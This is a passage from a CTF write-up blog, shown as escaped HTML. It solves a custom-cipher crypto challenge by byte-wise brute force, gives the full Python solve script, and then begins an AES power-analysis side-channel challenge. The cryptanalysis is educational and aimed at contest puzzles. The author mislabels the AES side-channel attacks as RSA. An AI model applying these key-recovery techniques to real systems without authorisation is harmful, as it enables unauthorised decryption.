style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main encryption function is &lt;code&gt;my_crypto_inner(text, secret)&lt;/code&gt;, which takes in 2 arguments - the text and the secret. We are given the text, and our goal is to recover the secret which is the flag.&lt;/p&gt;
&lt;p&gt;Upon some testing, I noticed that the encryption of each byte seemed to be independent of other bytes - that is, there was no shuffling around within the encryption.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# flag format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(encrypted[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ciphertext[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the script above gave the output&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80\x06&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\r\xae\xd6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;W&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice how the first 3 bytes &lt;code&gt;_\xce\x80&lt;/code&gt; are the same, as we entered the first 3 bytes correct (&lt;code&gt;p4{&lt;/code&gt; flag format)! This means we can recover the flag with a brute force approach, by appending a character to the end and checking if the encrypted matches the ciphertext at that index.&lt;/p&gt;
&lt;p&gt;For example, we can try encrypting &lt;code&gt;p4{a&lt;/code&gt;, &lt;code&gt;p4{b&lt;/code&gt; etc, and if the output at that index &lt;code&gt;3&lt;/code&gt; matched the given ciphertext at the same index, it would be the correct letter!&lt;/p&gt;
&lt;p&gt;We can automate this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_!@#$%^&amp;amp;*(),./&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# known flag format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(flag) &lt;span style=&#34;color:#75715e&#34;&gt;# index we are brute forcing at&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;bytes([c])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,temp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ciphertext[ind] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; encrypted[ind]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            flag&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;bytes([c])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ind&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;found char &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes([c])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, current flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this, we slowly but surely recover the full flag: &lt;code&gt;p4{It_4ls0_pu1ls_0ut_rodeNts_with_ITs_pawsFromShallowBurrows.}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/pallas-solve.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Full solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

#from sec import secret
#print(len(secret))

text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;

def bits_to_bytes(l):
	l = [str(f) for f in l]
	l=&amp;#34;&amp;#34;.join(l)
	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
	final = [int(x,2) for x in final]
	return bytes(final)

def bytes_to_bits(bb):
	r = &amp;#34;&amp;#34;
	for c in bb:
		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
	r= list(map(int, r))
	return r

def my_crypto_inner(text, secret):
	tl = len(text)
	sl = len(secret)
	enc = [0]*len(text)
	for i in range(tl):
		enc[i]=text[i]
		enc[i]^=secret[i % sl]
		for div in range(1, tl):
			if i%div == 0:
				enc[i] ^= enc[(i-div) % sl]
			if i&amp;gt;0 and div%i == 0:
				enc[i] ^= text[(i-div) % sl]
	return enc

def my_crypto(text, secret):
	text = bytes_to_bits(text)
	secret = bytes_to_bits(secret)
	res = my_crypto_inner(text,secret)
	return bits_to_bytes(res)

import string

cs = string.ascii_letters &amp;#43; string.digits &amp;#43; &amp;#34;{}_!@#$%^&amp;amp;*(),./&amp;#34;
cs = cs.encode()

ciphertext = b&amp;#39;_\xce\x80^\x86\x8b\xbe\x00\x15I\xa7]\x86M\x1f\xe8\x87\x8e\xa3\xec_\x8d\x8a\xbd\xd4\xe7\x923\xa1\x8cw\x15F\x06\x8a\xa87\xa6\xcd)/\xaf\xce\xbc\x90go\xc4\r(\xac\xb1ng\xd5\x88\\\x07\xa9z\\G\x8d\xc2\x9f\x9c\x89\xf8r\x87Ut\xf5\xdc\xdda9\xe0\xc5\xa0G\xb8\xf6\xbe\n\xb1\xd0\xdc-\xd6\xfc\x15\x13\xbf}\xbf5\xb0S\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba3\xd8\x8b\x0eR\x87$\xb3\xd6\xcd\xef\x92\xa1\xa3|\xb4-\n\xdbw\x86{DE&amp;#39;

flag = b&amp;#34;p4{&amp;#34; # known flag format
ind = len(flag) # index we are brute forcing at
while True:
    for c in cs:
        temp = flag&amp;#43;bytes([c])
        encrypted = my_crypto(text,temp.ljust(62,b&amp;#34;?&amp;#34;))
        if ciphertext[ind] == encrypted[ind]:
            flag&amp;#43;=bytes([c])
            ind&amp;#43;=1
            print(f&amp;#34;found char {bytes([c]).decode()}, current flag: {flag.decode()}&amp;#34;)
            break
    else:
	    break

print(flag.decode())

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;aes_observed-crypto---6-solves&#34;&gt;aes_observed (crypto) - 6 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;We have managed to get a person near our enemies encryption box.&lt;br&gt;
He actions are limited but he can run some encryptions for us and percsely measure voltage just after sbox.&lt;br&gt;
Can we do something with this information that would help us to recover some other plaintexts?&lt;br&gt;
HINT: the Key is a flag.&lt;br&gt;
&lt;code&gt;nc aes-observed.zajebistyc.tf 9999&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are only given a server to connect to, which responds with 50 plaintext to voltage pairs.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Plaintext                                                        Voltage
78a41912ae910166f57e6f1a46df63ee3a434860e116f5343d111181e657cc5c 2.512
5f55d8fdb3ab5881554eadda588587c053f32b3abf282557b8dff50d03d5656a 2.418
etc...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The challenge name &lt;code&gt;aes_observed&lt;/code&gt; hints to these plaintexts being encrypted with AES, and the given voltage suggests we need to perform an AES &lt;a href=&#34;https://en.wikipedia.org/wiki/Side-channel_attack&#34;&gt;side-channel attack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There are 2 main side channel attacks given voltages for RSA - Differential Power Analysis (DPA) and Correlation Power Analysis (CPA). To be honest, I have absolutely no idea how to perform these attacks.&lt;/p&gt;
&lt;p&gt;However, I remembered that in PicoCTF 2023 there was a very similar challenge series named &lt;code&gt;Power Analysis&lt;/code&gt;, which also featured RSA side-channel attacks.&lt;/p&gt;
&lt;p&gt;Searching for writeups on it, I found &lt;a href=&#34;https://eshard.com/posts/pico-ctf-power-analysis-challenges&#34;&gt;this article&lt;/a&gt;, where their writeup for &lt;code&gt;PowerAnalysis: Part 1&lt;/code&gt; proved to be extremely helpful.&lt;/p&gt;

  &lt;img src=&#34;./img/cpa-blog.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;There are a few differences between that challenge and the one we are trying to solve:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we are given less samples (50 instead of 500)&lt;/li&gt;
&lt;li&gt;the plaintexts are longer (32 bytes instead of 16)&lt;/li&gt;
